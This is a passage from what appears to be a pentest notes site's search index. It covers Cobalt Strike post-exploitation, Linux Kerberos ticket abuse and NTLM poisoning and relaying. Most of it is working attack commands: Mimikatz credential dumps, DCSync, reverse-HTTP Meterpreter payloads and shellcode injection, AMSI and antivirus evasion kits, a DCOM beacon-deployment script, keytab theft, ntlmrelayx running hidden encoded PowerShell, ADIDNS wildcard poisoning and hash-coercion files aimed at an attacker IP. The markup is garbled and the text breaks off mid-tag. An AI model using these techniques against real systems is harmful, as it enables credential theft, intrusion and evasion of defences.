</ul>"},{"location":"pentesting/cobalt/#ssh","title":"SSH","text":"<p><code>ssh ssh-key</code> </p>"},{"location":"pentesting/cobalt/#post-exploitation","title":"Post Exploitation","text":""},{"location":"pentesting/cobalt/#credentials","title":"Credentials","text":"<ul> <li>The <code>!</code>(Elevate to system) and <code>@</code>(Impersonate beacons thread) symbols are modifiers.</li> <li>Go to View -&gt; Credentials to see a copy of all the credentials </li> </ul>"},{"location":"pentesting/cobalt/#mimikatz-logonpasswords","title":"Mimikatz logonpasswords","text":"<p><code>mimikatz !sekurlsa::logonpasswords logonpasswords</code> </p>"},{"location":"pentesting/cobalt/#mimikatz-ekeys","title":"Mimikatz ekeys","text":"<p><code>mimikatz !sekurlsa::ekeys</code> </p>"},{"location":"pentesting/cobalt/#mimikatz-sam","title":"Mimikatz sam","text":"<p><code>mimikatz !lsadump::sam</code> </p>"},{"location":"pentesting/cobalt/#mimikatz-cached-credentials","title":"Mimikatz Cached Credentials","text":"<p><code>mimikatz !lsadump::cache</code> </p>"},{"location":"pentesting/cobalt/#dcsync","title":"DCSync","text":"<p><code>dcsync &lt;DOMAIN&gt; &lt;DOMAIN\\USER&gt;</code> </p>"},{"location":"pentesting/cobalt/#session-passing","title":"Session passing","text":""},{"location":"pentesting/cobalt/#beacon-passing","title":"Beacon passing","text":"<ul> <li>From one beacon type to another</li> <li>Spawn an process and inject shellcode for the specified listener into it. <code>spawn &lt;ARCHITECTURE&gt; &lt;LISTENER&gt;</code> </li> </ul>"},{"location":"pentesting/cobalt/#cobalt-strike-metasploit","title":"Cobalt strike --&gt; Metasploit","text":"<ul> <li>Only supports <code>x86</code> <code>sudo msfconsole -q use exploit/multi/handler set payload windows/meterpreter/reverse_http set LHOST eth0 set LPORT &lt;PORT&gt; exploit -j</code></li> <li>Go to Listeners --&gt; Add and set the Payload to Foreign HTTP. Set the Host, the Port, Set the name to <code>msf</code> and click Save. The command <code>spawn msf</code> will pass the session to metasploit. <code>spawn msf</code> </li> </ul>"},{"location":"pentesting/cobalt/#cobalt-strike-metasploit-shellcode-shinject-new-process","title":"Cobalt strike --&gt; Metasploit shellcode shinject new process","text":"<p>``` sudo msfconsole -q use exploit/multi/handler set payload windows/x64/meterpreter_reverse_http msfvenom -p windows/x64/meterpreter_reverse_http LHOST= LPORT=8080 -f raw -o /tmp/msf.bin <p>execute C:\\Windows\\System32\\notepad.exe ps shinject  x64 msf.bin <pre><code>#### Cobalt strike --&gt; Metasploit shellcode shspawn new process\n</code></pre> sudo msfconsole -q use exploit/multi/handler set payload windows/x64/meterpreter_reverse_http msfvenom -p windows/x64/meterpreter_reverse_http LHOST= LPORT=8080 -f raw -o /tmp/msf_http_x64.bin <p>shspawn x64 C:\\Payloads\\msf_http_x64.bin <pre><code>### Metasploit --&gt; Cobalt strike\n- Go to Attacks --&gt; Packages --&gt; Windows Executable (S), select the desired listener, select Raw as the Output type and select Use x64 payload.\n</code></pre> use post/windows/manage/shellcode_inject set SESSION 1 set SHELLCODE /tmp/beacon.bin run <pre><code>## Pivoting\n### Socksproxy\n#### Enable Socksproxy no auth\n- OPSEC: This binds the port on all interfaces and since there is no authentication available on SOCKS4, this port can technically be used by anyone\n</code></pre> socks  <pre><code>#### Enable Socksproxy auth\n- The enableLogging option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.  Instead, you can use journalctl:\n</code></pre> socks  socks5 disableNoAuth   enableLogging <pre><code>### Using proxychains\n#### Proxychains\n- For linux\n- Change proxychains config `socks5 &lt;IP&gt; &lt;PORT&gt; &lt;USER&gt; &lt;PASS&gt;`\n</code></pre> sudo vim /etc/proxychains.conf proxychains  <pre><code>#### Proxifier\n- https://www.proxifier.com/\n- For windows\n- Open Proxifier, go to Profile -&gt; Proxy Servers and Add a new proxy entry, which will point at the IP address and Port of your Cobalt Strike SOCKS proxy.\n- Next, go to Profile -&gt; Proxification Rules. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule, but in this example, I'm creating a single rule for adexplorer64.exe (part of the Sysinternals Suite).\n- Target hosts fill in the target internal network range with the action ```proxy socks &lt;TARGET&gt;```\n- NOTE: You will also need to add a static host entry in `C:\\Windows\\System32\\drivers\\etc\\hosts` file: `&lt;DC IP&gt; &lt;DOMAIN&gt;`. You can enable DNS lookups through Proxifier, but that will cause DNS leaks from your computer into the target environment.\n\n#### Proxychains netonly or overpass the hash\n</code></pre> runas /netonly /user:\\ \"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\" sekurlsa::pth /user: /domain: /ntlm: /run:\"C:\\windows\\system32\\mmc.exe C:\\windows\\system32\\dsa.msc\" <pre><code>#### Browser\n- Install FoxyProxy https://getfoxyproxy.org/\n- Configure Proxy IP and port, Username and Password.\n- NTLM auth: https://offensivedefence.co.uk/posts/ntlm-auth-firefox/\n\n#### Metasploit\n- In Cobalt Strike, go to View &gt; Proxy Pivots, highlight the existing SOCKS proxy and click the Tunnel button. \n- Paste string in msfconsole\n- Stop with ```socks stop```\n\n### Manual port forwards\n#### Remote port forward netsh\n- Requires administrator privs\n</code></pre> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport= connectaddress= connectport= protocol=tcp <pre><code>#### List forwards netsh\n</code></pre> netsh interface portproxy show v4tov4 <pre><code>#### Remove port forward netsh\n</code></pre> netsh interface portproxy delete v4tov4 listenaddress= listenport= <pre><code>### Rportfwd\n#### Create port forward\n- Beacon's reverse port forward always tunnels the traffic to the Team Server and the Team Server sends the traffic to its intended destination, so shouldn't be used to relay traffic between individual machines.\n- Does not require administrator privs\n- OPSEC: When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule. Have to create firewall rule first!\n</code></pre> powershell New-NetFirewallRule -DisplayName \"Test Rule\" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort  <p>rportfwd  <pre><code>#### Stop and remove firewall rule\n</code></pre> powershell Remove-NetFirewallRule -DisplayName \"Test Rule\" <p>rportfwd stop  <pre><code>#### Create port forward rportfwd_local\n- Beacon also has a rportfwd_local command.  Whereas rportfwd will tunnel traffic to the Team Server, rportfwd_local will tunnel the traffic to the machine running the Cobalt Strike client.\n- Does not require administrator privs\n- If 127.0.0.1 doesn't work use teamserver IP\n</code></pre> rportfwd_local  <pre><code>#### Stop port forward local\n</code></pre> rportfwd_local stop  <pre><code>### NTLMRelaying with cobalt strike\n- https://github.com/praetorian-inc/PortBender\n- Requires system privs\n\n#### Place portbender driver on the target\n</code></pre> cd C:\\Windows\\system32\\drivers upload WinDivert64.sys <pre><code>#### Load portbender.cna\n- Load `PortBender.cna` this adds a new PortBender command to the console in Cobalt strike -&gt; Script Manager\n- Breaks SMB service on the machine, also SMB Beacons. \n- Create the appropriate inbound firewall rules for 445 (file sharing is disabled by default), 8445, and 8080.\n</code></pre> help PortBender PortBender redirect 445 8445 <pre><code>#### Create port forward\n- Create a reverse port forward that will then relay the traffic from port 8445 to port 445 on the Team Server (where ntlmrelayx will be waiting).\n</code></pre> rportfwd 8445 127.0.0.1 445 <pre><code>#### Allow 8445 firewall\n</code></pre> powershell New-NetFirewallRule -DisplayName \"Test Rule\" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8445 <pre><code>#### Create sockx proxy\n</code></pre> socks 1080 socks5 disableNoAuth socks_user socks_password <pre><code>#### NTLMRelay execute command\n</code></pre> sudo proxychains ntlmrelayx.py -t smb:// -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc ' <pre><code>#### Stop portbender\n</code></pre> jobs jobkill  kill  <pre><code>## Evasion\n### Malleable C2 profile\n- Example: https://github.com/Cobalt-Strike/Malleable-C2-Profiles\n- Changes to C2 profile requires teamserver restart and a new beacon!\n- Good changes: https://github.com/WKL-Sec/Malleable-CS-Profiles\n\n#### Check profile for errors\n</code></pre> ./c2lint  <pre><code>### Amsi bypass\n#### Add the following to the .profile\n- `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It does not apply to the powershell command\n</code></pre> post-ex {     set amsi_disable \"true\"; } <pre><code>### Spawnto\n- `rundll32` being the default `spawnto` for Cobalt Strike is a common point of detectiom.\n- The process used for post-ex commands and psexec can be changed on the fly in the CS GUI. \n\n#### Change spawnto\n</code></pre> spawnto x64 %windir%\\sysnative\\dllhost.exe spawnto x86 %windir%\\syswow64\\dllhost.exe <pre><code>#### Revert spawnto\n</code></pre> spawnto <pre><code>#### Change spawnto psexec\n</code></pre> ak-settings spawnto_x64 C:\\Windows\\System32\\dllhost.exe ak-settings spawnto_x86 C:\\Windows\\SysWOW64\\dllhost.exe <pre><code>#### Change service name for psexec\n</code></pre> ak-settings service  <pre><code>#### C2 profile\n</code></pre> post-ex {         set amsi_disable \"true\"; <pre><code>    set spawnto_x64 \"%windir%\\\\sysnative\\\\dllhost.exe\";\n    set spawnto_x86 \"%windir%\\\\syswow64\\\\dllhost.exe\";\n</code></pre> <p>} ``` </p>"},{"location":"pentesting/cobalt/#artifact-kit","title":"Artifact-kit","text":"<ul> <li>Used to modify the binary (EXE &amp; DLL) payloads</li> <li>Location <code>cobaltstrike\\arsenal-kit\\kits\\artifact</code></li> <li>The <code>src-main/main.c</code> is the entry points for the EXE artifacts.</li> <li><code>src-common/bypass-template.c</code> shows how one can implement some logic inside the start function from <code>main.c</code></li> <li>We can use the <code>bypass-pipe.c</code> to evade AV. </li> </ul>"},{"location":"pentesting/cobalt/#change-bypass-pipec","title":"Change bypass-pipe.c","text":"<p><code>vim /opt/cobaltstrike/artifact-kit/src-common/bypass-pipe.c</code> </p>"},{"location":"pentesting/cobalt/#edit-the-following-line","title":"Edit the following line","text":"<ul> <li>Nothing needs to be changed right now, but might want to change the pipe name part. Example: <code>\"%c%c%c%c%c%c%c%c%cnetsvc\\\\%d\" \"%c%c%c%c%c%c%c%c%cprintsvc-%d-server\"</code> </li> </ul>"},{"location":"pentesting/cobalt/#built-artifact-kit","title":"Built artifact kit","text":"<ul> <li>Files should go to the client. <code>./build.sh &lt;techniques&gt; &lt;allocator&gt; &lt;stage&gt; &lt;rdll size&gt; &lt;include resource file&gt; &lt;output directory&gt; ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts</code> </li> </ul>"},{"location":"pentesting/cobalt/#load-artifactcna","title":"Load artifact.cna","text":"<ul> <li>Click on Cobalt Strike -&gt; Script Manager -&gt; Load <code>artifact.cna</code> from the output directory</li> <li>Reload cobaltstrike UI</li> <li>Use Payloads -&gt; Windows Stageless Generate All Payloads to replace all  </li> </ul>"},{"location":"pentesting/cobalt/#run-threatcheck-on-payload","title":"Run threatcheck on payload","text":"<p><code>.\\ThreatCheck.exe -f &lt;PAYLOAD&gt;</code> </p>"},{"location":"pentesting/cobalt/#resource-kit","title":"Resource-kit","text":"<ul> <li>Used to modify script-based payloads including the PowerShell, Python, HTA and VBA templates.</li> <li>Location: <code>cobaltstrike\\arsenal-kit\\kits\\resource</code></li> <li>Using <code>template.x64.ps1</code> is enough.</li> <li>Files should go to the client. </li> </ul>"},{"location":"pentesting/cobalt/#change-templatex64ps1","title":"Change template.x64.ps1","text":"<ul> <li>From --&gt; To</li> <li>Change ALL variables in the file ``` for ($zz = 0; $zz -lt $v_code.Count; $zz++) {     $v_code[$zz] = $v_code[$zz] -bxor 35 }</li> </ul> <p>for ($i = 0; $i -lt $v_service.Count; $i++) {     $var_service[$i] = $v_service[$i] -bxor 35 } <pre><code>#### Channge compress.ps1\n- https://offensivedefence.co.uk/posts/making-amsi-jump/\n\n#### Rebuilt resource kit\n</code></pre> ./build.sh /mnt/c/Tools/cobaltstrike/resources <pre><code>#### Load resources.cna\n- Click on Cobalt Strike -&gt; Script Manager -&gt; Load `resources.cna` \n- Reload cobaltstrike UI\n- Use Payloads -&gt; Windows Stageless Generate All Payloads to replace all\n\n#### Run threatcheck on payload\n</code></pre> .\\ThreatCheck.exe -f  -e AMSI <pre><code>## Extending Cobalt Strike\n### Agressor scripts\n### Jump and remote-exec\n- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exploit_register\n- https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_remote_exec_method_register\n\n#### Jump dcom command\n- Using https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Invoke-DCOM.ps1\n</code></pre> sub invoke_dcom {     local('$handle $script $oneliner $payload'); <pre><code># acknowledge this command1\nbtask($1, \"Tasked Beacon to run \" . listener_describe($3) . \" on $2 via DCOM\", \"T1021\");\n\n# read in the script\n$handle = openf(getFileProper(\"C:\\\\Tools\", \"Invoke-DCOM.ps1\"));\n$script = readb($handle, -1);\nclosef($handle);\n\n# host the script in Beacon\n$oneliner = beacon_host_script($1, $script);\n\n# generate stageless payload\n$payload = artifact_payload($3, \"exe\", \"x64\");\n\n# upload to the target\nbupload_raw($1, \"\\\\\\\\ $+ $2 $+ \\\\C$\\\\Windows\\\\Temp\\\\beacon.exe\", $payload);\n\n# run via powerpick\nbpowerpick!($1, \"Invoke-DCOM -ComputerName  $+  $2  $+  -Method MMC20.Application -Command C:\\\\Windows\\\\Temp\\\\beacon.exe\", $oneliner);\n\n# link if p2p beacon\nbeacon_link($1, $2, $3);\n</code></pre> <p>}</p> <p>beacon_remote_exploit_register(\"dcom\", \"x64\", \"Use DCOM to run a Beacon payload\", &amp;invoke_dcom); ```</p>"},{"location":"pentesting/cobalt/#beacon-object-files","title":"Beacon Object Files","text":"<ul> <li>Beacon Object Files (BOFs) are a post-ex capability that allows for code execution inside the Beacon host process.</li> <li>BOFs are essentially tiny COFF objects (written in C or C++) on which Beacon acts as a linker and loader. </li> <li>Download https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/beacon.h</li> <li>Usefull BOFs:</li> <li>https://github.com/WKL-Sec/HiddenDesktop</li> <li>https://github.com/trustedsec/CS-Situational-Awareness-BOF</li> <li>https://github.com/CCob/BOF.NET</li> <li>https://github.com/helpsystems/nanodump</li> <li>https://github.com/outflanknl/InlineWhispers</li> </ul>"},{"location":"pentesting/cobalt/#external-c2","title":"External C2","text":"<ul> <li>https://github.com/RedSiege/GraphStrike?tab=readme-ov-file</li> </ul>"},{"location":"pentesting/linux/","title":"Linux Active Directory","text":""},{"location":"pentesting/linux/#enumeration","title":"Enumeration","text":""},{"location":"pentesting/linux/#check-if-linux-host-is-ad-joined","title":"Check if Linux host is AD Joined","text":"<ul> <li>Check for file <code>krb5.conf</code> <pre><code>ls -lsa /etc/krb5.conf\ncat /etc/krb5.conf\n</code></pre></li> </ul>"},{"location":"pentesting/linux/#check-for-keytab-files","title":"Check for keytab files","text":"<ul> <li>And check who can acces the keytab files</li> <li>A keytab is a file containing pairs of Kerberos principals and encrypted keys that are derived from the Kerberos password. The most common use of keytab files is to allow scripts to authenticate to Kerberos without human interaction or without storing the password in a plain text file. <pre><code>ls -lsa /etc/krb5.keytab\n\nfind / -name *.keytab*\nls -lsa &lt;PATH TO FILE&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/linux/#check-for-ticket-files","title":"Check for ticket files","text":"<ul> <li>Are normally stored in <code>/tmp</code></li> <li>Kerberos ticket name format is <code>krb5cc_%{uid}</code> where uid is the user UID. </li> <li>To find the location where they are stored check the config file <code>/etc/krb5.conf</code> <pre><code>ls /tmp/ | grep krb5cc\n</code></pre></li> </ul>"},{"location":"pentesting/linux/#kernel-keys","title":"Kernel Keys","text":"<ul> <li>If tickets aren't saved in files they are saved in Linux Kernel Keys</li> <li>Can use https://github.com/TarlogicSecurity/tickey to convert them to files</li> </ul>"},{"location":"pentesting/linux/#reusing-and-abusing-ccache-and-keytabs","title":"Reusing and abusing ccache and keytabs","text":""},{"location":"pentesting/linux/#ccache-ticket-reuse-from-tmp","title":"CCACHE ticket reuse from /tmp","text":"<ul> <li>When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in <code>/tmp</code> and scoped with 600 permissions</li> </ul>"},{"location":"pentesting/linux/#list-the-current-ticket-used-for-authentication","title":"List the current ticket used for authentication","text":"<p><pre><code>env | grep KRB5CCNAME\n````\n\n#### Reuuse ticket\n</code></pre> export KRB5CCNAME=/tmp/ticket.ccache <pre><code>### Convert ccache to kirbi\n</code></pre> impacket-ticketConverter krb5cc_ <pre><code>### CCACHE ticket reuse from Kernel Keys\n- Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey\n</code></pre>"},{"location":"pentesting/linux/#configuration-and-build","title":"Configuration and build","text":"<p>git clone https://github.com/TarlogicSecurity/tickey cd tickey/tickey make CONF=Release</p> <p>.\\tickey -i <pre><code>### CCACHE ticket reuse from SSSD KCM\n- https://github.com/fireeye/SSSDKCMExtractor\n- SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. \n- The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. \n- By default, the key is only readable if you have **root** permissions.\n- Invoking `SSSDKCMExtractor` with the --database and --key parameters will parse the database and decrypt the secrets.\n</code></pre> python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey <pre><code>- The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.\n\n\n### CCACHE ticket reuse from keytab\n- https://github.com/its-a-feature/KeytabParser\n</code></pre> python KeytabParser.py /etc/krb5.keytab klist -k /etc/krb5.keytab <pre><code>#### Manually use keytab file\n- Request CIFS TGS to abuse it with secretsdump or psexec on attacking machine\n</code></pre> kinit -k -t   kvno CIFS/\\ klist base64"},{"location":"pentesting/linux/#on-attacker-machine","title":"ON ATTACKER MACHINE","text":"<p>echo \"\" | base64 -d &gt; ticket.ccache export KRB5CCNAME=ticket.ccache python3 psexec -k -no-pass  <pre><code>### Extract accounts from /etc/krb5.keytab\n- The service keys used by services that run as root are usually stored in the keytab file ```/etc/krb5.keytab```. This service key is the equivalent of the service's password, and must be kept secure. \n\nUse `klist` to read the keytab file and parse its content. The key that you see when the [key type](https://cwiki.apache.org/confluence/display/DIRxPMGT/Kerberos+EncryptionKey) is 23  is the actual NT Hash of the user.\n</code></pre> $ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab <pre><code>#### KeytabExtract\n- On Linux you can use [`KeyTabExtract`](https://github.com/sosdave/KeyTabExtract): we want RC4 HMAC hash to reuse the NLTM hash.\n</code></pre> python3 keytabextract.py krb5.keytab  <pre><code>#### Connect to the machine with CME.\n</code></pre> crackmapexec  -u '' -H \"\" -d   ```"},{"location":"pentesting/relaying/","title":"Relaying &amp; Poisoning","text":""},{"location":"pentesting/relaying/#poisoning","title":"Poisoning","text":"<ul> <li>Poisoning is possible with Responder or Inveigh or manually, which will try to poison Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).</li> </ul>"},{"location":"pentesting/relaying/#llmnr-nbt-ns","title":"LLMNR &amp; NBT-NS","text":""},{"location":"pentesting/relaying/#responder","title":"Responder","text":""},{"location":"pentesting/relaying/#analyse-mode","title":"Analyse mode","text":"<ul> <li>It is possible to check if LLMNR and NBT-NS is used without poisoning any request. <pre><code>sudo responder -I eth0 -A\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#poison-requests","title":"Poison Requests","text":"<ul> <li>Poison Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS) requests. <pre><code>sudo responder -I eth0\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#inveigh","title":"Inveigh","text":"<ul> <li>https://github.com/Kevin-Robertson/Inveigh</li> <li>Can poison LLMNR and NBTNS, but also ADIDNS</li> <li>Use <code>-ConsoleOutput Y</code> to enable ConsoleOutput</li> </ul>"},{"location":"pentesting/relaying/#analyse-mode_1","title":"Analyse mode","text":"<pre><code>Invoke-Inveigh -Inspect\n</code></pre>"},{"location":"pentesting/relaying/#run-inveigh","title":"Run inveigh","text":"<pre><code>Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y\n</code></pre>"},{"location":"pentesting/relaying/#get-data-from-hashtable","title":"Get data from hashtable","text":"<pre><code>Get-Inveigh - get data from the $inveigh hashtable\n</code></pre>"},{"location":"pentesting/relaying/#get-all-captured-ntlmv2-challengeresponse-hashes","title":"Get all captured NTLMv2 challenge/response hashes","text":"<pre><code>Get-Inveigh -NTLMv2\n</code></pre>"},{"location":"pentesting/relaying/#stop","title":"Stop","text":"<pre><code>Stop-Inveigh\n</code></pre>"},{"location":"pentesting/relaying/#enable-real-time-console-output","title":"Enable real time console output","text":"<pre><code>Watch-Inveigh\n</code></pre>"},{"location":"pentesting/relaying/#clear-hashtable","title":"Clear hashtable","text":"<pre><code>Clear-Inveigh\n</code></pre>"},{"location":"pentesting/relaying/#get-inveigh","title":"Get-Inveigh","text":"<pre><code>Get-Inveigh\n</code></pre>"},{"location":"pentesting/relaying/#active-directory-integrated-dns","title":"Active Directory-Integrated DNS","text":"<ul> <li>ADIDNS</li> <li>Windows uses DNS, LLMNR and then NBNS in the respective order</li> <li>If a matching DNS record name does not already exist in a zone, an authenticated user can create the record.</li> <li>If you detectthe same LLMNR/NBNS request from multiple systems, a matching record can be added to ADIDNS. This can be effective when systems are sending out LLMNR/NBNS requests for old hosts that are no longer in DNS. If multiple systems within a subnet are trying to resolve specific names, outside systems may also be trying. In that scenario, injecting into ADIDNS will help extend the attack past the subnet boundary.</li> <li>https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/</li> <li>https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing</li> <li>https://github.com/Kevin-Robertson/Powermad</li> </ul>"},{"location":"pentesting/relaying/#check-wins-forward-lookup","title":"Check WINS forward lookup","text":"<ul> <li>If WINS forward lookup is enabled then adding a wildcard record won't work.</li> <li>https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py</li> <li>The entry type <code>65281</code> (i.e. <code>WINS</code>) will exist if WINS forward lookup is enabled. <pre><code>dnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '@' --action 'query' &lt;DC IP&gt;\n\ndnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '@' --action 'query' &lt;DC IP&gt; | grep \"WINS\\|65281\"\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#check-adidns-permissions","title":"Check ADIDNS permissions","text":"<ul> <li>By default <code>authenticated users</code> have the <code>CreateChild</code> permissions. <pre><code>Get-ADIDNSPermission\n\nGet-ADIDNSPermission | Where-Object -Property IdentityReference -EQ S-1-5-11 | Where-Object -Property ActiveDirectoryRights -EQ CreateChild\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#check-for-wildcard-record","title":"Check for wildcard record","text":"<ul> <li>The DNS server will use the wildcard record to answer name requests that do not explicitly match records contained in the zone.</li> <li>Gives error if it doesn't exist. <pre><code>Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord\n\nGet-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition System\nGet-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones\n</code></pre></li> </ul> <pre><code>dnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action 'query' &lt;DC IP&gt;\ndnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action 'query' &lt;DC IP&gt; --legacy\ndnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action 'query' &lt;DC IP&gt; --forest\ndnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action 'query' &lt;DC IP&gt; --partition\n</code></pre>"},{"location":"pentesting/relaying/#create-wildcard-record","title":"Create wildcard record","text":"<ul> <li>By default, replication between sites can take up to three hours.</li> <li>Use <code>-Tombstone</code> so any authenticated user can perform node modifications <pre><code>New-ADIDNSNode -Node * -Data &lt;ATTACKER IP&gt; -Verbose\n\nNew-ADIDNSNode -Node * -Data &lt;ATTACKER IP&gt; -Verbose -Tombstone\n</code></pre></li> </ul> <pre><code>dnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action add --data &lt;ATTACKER IP&gt; &lt;DC IP&gt;\n</code></pre>"},{"location":"pentesting/relaying/#give-other-groups-permissions-to-the-record","title":"Give other groups permissions to the record","text":"<ul> <li>Optional <pre><code>Grant-ADIDNSPermission -Node * -Principal \"Authenticated Users\" -Access GenericAll -Verbose\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#enable-tombstoned-record","title":"Enable tombstoned record","text":"<pre><code>Enable-ADIDNSNode -Node *\n</code></pre>"},{"location":"pentesting/relaying/#tombstone-record","title":"Tombstone record","text":"<pre><code>Disable-ADIDNSNode -Node *\n</code></pre>"},{"location":"pentesting/relaying/#cleanup-record","title":"Cleanup record","text":"<pre><code>Remove-ADIDNSNode -Node *\n</code></pre> <pre><code>dnstool.py -u 'DOMAIN\\USER' -p 'PASSWORD' --record '*' --action remove --data &lt;ATTACKER IP&gt; &lt;DC IP&gt;\n</code></pre>"},{"location":"pentesting/relaying/#check-dns","title":"Check DNS","text":"<pre><code>nslookup idontexist.&lt;DOMAIN&gt;\nResolve-DnsName idontexist.&lt;DOMAIN&gt;\n</code></pre>"},{"location":"pentesting/relaying/#inveigh_1","title":"Inveigh","text":"<ul> <li>Inveigh can dynically spoof this too</li> <li><code>combo</code> Add a record to DNS if the same request is received with LLMNR/NBNS from multiple systems</li> <li><code>ns</code> injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad.</li> <li><code>wildcard</code> injects a wildcard record <pre><code>Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#mitm6","title":"Mitm6","text":"<ul> <li>https://github.com/dirkjanm/mitm6</li> <li>In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.</li> <li>However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.</li> <li>Spoof any requests for internal resources <pre><code>sudo python3 mitm6.py -d &lt;DOMAIN&gt; --ignore-nofqdn\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#files","title":"Files","text":"<ul> <li>It is possible to force authentication if a user opens a file location in explorer or files itself.</li> <li>Will authenticate to our attacking machine as the user</li> <li>Tools that can create these files:</li> <li>https://github.com/mdsecactivebreach/Farmer - Windows</li> <li>https://github.com/Greenwolf/ntlm_theft - Python</li> </ul>"},{"location":"pentesting/relaying/#link-file","title":"Link file","text":"<ul> <li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li> <li>On Windows right click --&gt; New --&gt; Shortcut --&gt; and in the URL use</li> <li>Creates a <code>[SMB] NTLMv2-SSP Hash</code> in responder, <code>[*] SMBD-Thread-4:</code> in ntlmrelayx. Can be used against relaying to SMB. <pre><code>file://&lt;IP&gt;/test\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#url-file","title":"URL file","text":"<ul> <li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li> <li>Filename <code>something.url</code></li> <li>Creates a <code>[SMB] NTLMv2-SSP Hash</code> in responder, <code>[*] SMBD-Thread-x:</code> in ntlmrelayx. Can be used against relaying to SMB. <pre><code>[InternetShortcut]\nURL=whatever\nWorkingDirectory=whatever\nIconFile=\\\\&lt;IP&gt;\\%USERNAME%.icon\nIconIndex=1\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#searchconnector","title":"SearchConnector","text":"<ul> <li>Explorer automaticly connects if folder where the SearchConnector is, is opened.</li> <li>Actives the Windows Webclient service which can be used to authenticate a host again to the attacking IP with petitpotam.</li> <li>Creates a <code>[WebDAV] NTLMv2 Hash</code> in responder, <code>HTTPD: received</code> in ntlmrelayx. Can be used against relaying to ldap, ldaps and SMB</li> <li>https://www.bussink.net/webclient_activation/</li> <li>Filename <code>Documents.searchConnector-ms</code> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;searchConnectorDescription xmlns=\"http://schemas.microsoft.com/windows/2009/searchConnector\"&gt;\n    &lt;iconReference&gt;imageres.dll,-1002&lt;/iconReference&gt;\n    &lt;description&gt;Microsoft Outlook&lt;/description&gt;\n    &lt;isSearchOnlyItem&gt;false&lt;/isSearchOnlyItem&gt;\n    &lt;includeInStartMenuScope&gt;true&lt;/includeInStartMenuScope&gt;\n    &lt;iconReference&gt;//&lt;ATTACKER IP&gt;@80/test.ico&lt;/iconReference&gt;\n    &lt;templateInfo&gt;\n        &lt;folderType&gt;{91475FE5-586B-4EBA-8D75-D17434B8CDF6}&lt;/folderType&gt;\n    &lt;/templateInfo&gt;\n    &lt;simpleLocation&gt;\n        &lt;url&gt;//&lt;ATTACKER IP&gt;@80/test&lt;/url&gt;\n    &lt;/simpleLocation&gt;\n&lt;/searchConnectorDescription&gt;\n</code></pre></li> </ul>"},{"location":"pentesting/relaying/#1x1-image-in-emails","title":"1x1 image in Emails","text":"<pre><code>&lt;img src=\"\\\\&lt;IP&gt;\\test.ico\" height=\"1\" width=\"1\" 